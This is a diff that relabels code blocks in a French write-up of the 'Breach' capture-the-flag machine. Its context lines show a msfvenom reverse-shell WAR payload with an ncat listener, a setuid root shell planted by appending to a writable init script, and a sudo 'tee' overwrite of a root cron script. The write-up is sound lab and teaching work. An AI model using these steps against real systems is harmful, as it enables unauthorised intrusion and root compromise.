@@ -233,7 +233,7 @@ msfvenom --payload java/jsp_shell_reverse_tcp -f war LHOST=192.168.110.1 LPORT=9
 
 On met un ncat en écoute et on charge l'URL où le war s'est déployé (une fois uploadé via l'interface web de Tomcat) :
 
-```shellsession
+```bash
 $ ncat -l -p 9999 -v
 Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::9999
@@ -246,7 +246,7 @@ uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
 
 Il y a deux utilisateurs. L'un s'appelle `Milton` (tout le CTF s'inspire du film [35 heures, c'est déjà trop](https://fr.wikipedia.org/wiki/35_heures,_c%27est_d%C3%A9j%C3%A0_trop). Il a une copie du keystore que l'on connait déjà ainsi qu'un script world-writable mais ce dernier contient du texte (pas de commandes bash) sans importance.
 
-```shellsession
+```bash
 tomcat6@Breach:/tmp$ ls -al /home/milton
 total 156
 drwxr-xr-x 3 milton milton   4096 Jun  6  2016 .
@@ -316,7 +316,7 @@ Malheureusement ici il s'agit de  `rm` et je n'ai pas vu de scénario d'attaque 
 
 En cherchant les fichiers modifiables apartenant à `root` j'ai trouvé un script dans `init.d` :
 
-```shellsession
+```bash
 milton@Breach:~$ find / -type f -user root -writable 2> /dev/null  | grep -v /proc | grep -v /sys
 /etc/init.d/portly.sh
 ```
@@ -329,7 +329,7 @@ echo "cp /bin/sh /tmp/rootshell; chmod 4755 /tmp/rootshell" >> portly.sh
 
 On reboot, on relance notre webshell Tomcat et on trouve bien le binaire setuid qu'on a demandé :
 
-```shellsession
+```bash
 $ ncat -l -p 9999 -v
 Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::9999
@@ -401,7 +401,7 @@ total 912
 
 L'une d'elle contient un commentaire dans les données EXIF qui correspond à un mot de passe :
 
-```shellsession
+```bash
 $ exiftool bill.png 
 ExifTool Version Number         : 12.45
 File Name                       : bill.png
@@ -429,7 +429,7 @@ Megapixels                      : 0.199
 
 Il permet de se connecter avec l'utilisateur `blumbergh`. Ce dernier dispose d'une autorisation spéciale pour faire un `tee` sur la tache planifiée de root que l'on a vu plus tôt.
 
-```shellsession
+```bash
 milton@Breach:~$ su blumbergh 
 Password: 
 blumbergh@Breach:/home/milton$ sudo -l
@@ -446,7 +446,7 @@ Comme `LinPEAS` génère beaucoup d'information, le coupler avec `tee` me permet
 
 Ici je vais appeler directement `tee` sans pipe et taper le script que je veut sur l'entrée standard. Du au fonctionnement du programme, les données sont aussitôt affichées. C'est pour cela qu'elles apparaissen deux fois ici (mais dans le fichier elle n'y seront qu'une fois) :
 
-```shellsession
+```bash
 blumbergh@Breach:/home/milton$ sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
 #!/bin/sh
 #!/bin/sh
